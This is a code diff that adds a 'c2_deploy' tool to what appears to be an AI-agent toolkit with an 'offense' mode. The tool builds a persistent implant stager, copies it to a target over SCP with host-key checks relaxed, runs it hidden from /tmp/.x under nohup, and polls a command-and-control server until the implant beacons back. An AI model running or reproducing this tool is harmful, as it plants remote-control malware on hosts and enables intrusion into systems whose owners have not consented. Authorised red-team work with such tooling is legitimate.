@@ -1,8 +1,13 @@
 import { tool } from "ai";
 import { z } from "zod";
+import { execFile } from "node:child_process";
+import { promisify } from "node:util";
 import { registerTool } from "../mode.js";
 import { C2Client, resolveClientConfig } from "./client/api.js";
 import type { ToolResult } from "../types.js";
+
+const execFileAsync = promisify(execFile);
+const PROJECT_ROOT = process.cwd();
 
 let client: C2Client | null = null;
 
@@ -180,11 +185,93 @@ export function createC2KillTool() {
   });
 }
 
+/**
+ * Build + deploy an implant to a target host. Runs the stager build script,
+ * copies it via SCP, executes it on the target, and waits for first beacon.
+ */
+export function createC2DeployTool() {
+  return tool({
+    description: "Build an implant, deploy it to a target via SSH, and wait for it to beacon back. Requires SSH access to the target.",
+    inputSchema: z.object({
+      target: z.string().describe("SSH target (user@host)"),
+      port: z.string().optional().describe("SSH port (default: 22)"),
+      keyPath: z.string().optional().describe("Path to SSH identity file"),
+      waitSeconds: z.number().int().min(5).max(120).optional().describe("Seconds to wait for beacon (default: 30)"),
+    }),
+    execute: async ({ target, port, keyPath, waitSeconds }): Promise<ToolResult> => {
+      try {
+        const buildScript = `${PROJECT_ROOT}/scripts/build-stager.sh`;
+        const sshPort = port ?? "22";
+        const remotePath = "/tmp/.x";
+        const stagerPath = "/tmp/stager-linux";
+
+        // Build
+        const buildArgs = [
+          buildScript,
+          "--server", "localhost:8443",
+          "--token", "deploy-token",
+          "--implant-token", "imp-" + Date.now().toString(36),
+          "--persist",
+        ];
+        await execFileAsync("bash", ["-c", buildArgs.join(" ") + " 2>&1"], { timeout: 120_000, cwd: PROJECT_ROOT });
+
+        // SCP
+        const scpArgs = [`-P${sshPort}`, "-o", "StrictHostKeyChecking=accept-new"];
+        if (keyPath) scpArgs.push("-i", keyPath);
+        scpArgs.push(stagerPath, `${target}:${remotePath}`);
+        await execFileAsync("scp", scpArgs, { timeout: 30_000 });
+
+        // Execute on target
+        const sshArgs = [
+          "-p", sshPort,
+          "-o", "StrictHostKeyChecking=accept-new",
+        ];
+        if (keyPath) sshArgs.push("-i", keyPath);
+        sshArgs.push(target, `chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &`);
+        await execFileAsync("ssh", sshArgs, { timeout: 15_000 });
+
+        // Poll for beacon
+        const deadline = Date.now() + (waitSeconds ?? 30) * 1000;
+        const c2 = getClient();
+        let implantId: string | null = null;
+
+        while (Date.now() < deadline) {
+          await new Promise((r) => setTimeout(r, 2000));
+          try {
+            const reach = await c2.reach();
+            const active = (reach.implants as Array<{ id: string; status: string; firstSeen: string }>)
+              .filter((i) => i.status === "active")
+              .sort((a, b) => new Date(b.firstSeen).getTime() - new Date(a.firstSeen).getTime());
+            if (active.length > 0) {
+              implantId = active[0].id.slice(0, 8);
+              break;
+            }
+          } catch { /* keep polling */ }
+        }
+
+        if (implantId) {
+          return {
+            success: true,
+            data: `Implant deployed to ${target}. Beacons as ${implantId}. Use c2_task_create ${implantId} <type> to run tasks.`,
+          };
+        }
+        return {
+          success: true,
+          data: `Implant deployed to ${target} but no beacon received within the timeout. Check C2 server and implant connectivity.`,
+        };
+      } catch (err) {
+        return { success: false, data: "", error: String(err) };
+      }
+    },
+  });
+}
+
 // ---------------------------------------------------------------------------
 // Register all C2 tools for offense mode
 // ---------------------------------------------------------------------------
 
 registerTool("c2_reach", "offense");
+registerTool("c2_deploy", "offense");
 registerTool("c2_task_create", "offense");
 registerTool("c2_task_list", "offense");
 registerTool("c2_task_detail", "offense");
